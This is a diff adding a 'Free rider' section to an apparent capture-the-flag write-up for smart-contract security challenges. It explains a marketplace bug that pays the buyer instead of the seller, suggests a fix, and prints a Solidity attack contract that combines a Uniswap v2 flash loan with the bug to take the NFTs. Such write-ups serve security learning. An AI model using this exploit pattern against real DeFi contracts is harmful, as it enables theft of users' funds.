@@ -224,6 +224,69 @@ The strategy is pretty much the same but we need to adjust to using Uniswap v2.
 Still no additional smart contract required unless you want to do it all in one transaction.
 
 ### Free rider
+The objective here is to steal some NFTs from a marketplace. 
+
+The NFTs cost more ETH than we have so we can split this into two problems.
+1) How to exploit the marketplace.
+2) How to get the ETH necessary. 
+
+The first problem didn't take too long to solve. There's a pretty serious bug here in FreeRiderNFTMarketplace.__buyOne.
+
+```solidity
+// transfer from seller to buyer
+token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
+
+// pay seller
+payable(token.ownerOf(tokenId)).sendValue(priceToPay);
+```
+First the token is transfered from the seller to the buyer, then the seller is sent payment. 
+
+The error is that the owner of the tokenId to determine the seller. The token has already been transferred so the buyer is the now the owner and will get both the NFT and their payment returned. 
+
+A fix for this would be to either send the payement first or store the seller address before transferring the NFT.
+
+The next part of the problem wasn't conceptualy difficult but it took some time to get it right. 
+
+We need a flash loan from Uniswap v2. I was surprised that there wasn't much example code for this available online (at least I couldn't find it). 
+
+This required a smart contract. The attack function gets a flash loan from Uniswap. uniswapV2Call is called by uniswap after they issue the loan.
+
+```solidity
+function attack(uint256 price, uint256[] calldata tokenIds) external {
+  bytes memory data = abi.encode(price, tokenIds);
+  IUniswapV2Pair(pair).swap(price, 0, address(this), data);
+}
+function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override{
+  require(msg.sender == pair);
+  require(sender == address(this));
+
+  uint amount = amount0; //amount0 is WETH
+  uint fee = ((amount * 3) / 997) + 1;
+  uint repayAmount = amount + fee;
+
+  (uint256 price, uint256[] memory tokenIds) = abi.decode(data, (uint256, uint256[]));
+
+  // Turn it into ETH so we can buy from marketplace
+  WETH.withdraw(amount);
+
+  // Buy all the NFTs and get paid out as the seller.
+  marketplace.buyMany{value: price}(tokenIds);
+
+  // Send them all to the buyer for bounty.
+  for(uint i=0; i < tokenIds.length; i++){
+    nft.safeTransferFrom(address(this), buyer, tokenIds[i]);
+  }
+
+  // Repay the loan.
+  // Turn it back into WETH0
+  WETH.deposit{value: repayAmount}();
+  WETH.transfer(pair, repayAmount);
+
+  // Send remaining ETH back to attacker.
+  payable(owner).transfer(address(this).balance);
+}
+```
+Conceptually this wasn't too difficult but there was a lot of boilerplate code to get right (fee calculation, convering between WETH/ETH, etc). 
 
 ### Backdoor
 ### Climber
